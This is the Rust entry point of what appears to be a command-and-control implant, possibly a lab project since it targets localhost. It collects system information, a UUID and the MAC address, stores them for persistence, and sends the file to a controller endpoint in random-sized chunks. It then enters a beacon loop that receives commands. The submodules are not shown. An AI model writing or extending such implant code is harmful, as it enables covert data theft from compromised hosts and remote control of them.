use std::path::Path;

mod beacon;
mod commands;
mod sysinfo;
mod utils;

const FILE_URL: &str = "http://localhost:5000/api/v1/file";
const BEACON_URL: &str = "http://localhost:5000/api/v1/beacon";
const SYSINFO_FILE: &str = "sysinfo.dat";

#[tokio::main]
async fn main() {
    let sysinfo_path = Path::new(SYSINFO_FILE);

    // Retrieve system information and UUID, which is saved in a file for persistence
    let (uuid, mac_addr) = sysinfo::saver::save_file().expect("Error saving file");

    // Send given file in random sized chunks
    if let Err(e) = commands::send_file::send_file(sysinfo_path, FILE_URL).await {
        eprintln!("Error sending file: {}", e);
    }

    // Run the main loop to send beacons and receive commands
    beacon::sender::run(uuid, mac_addr, BEACON_URL).await;
}
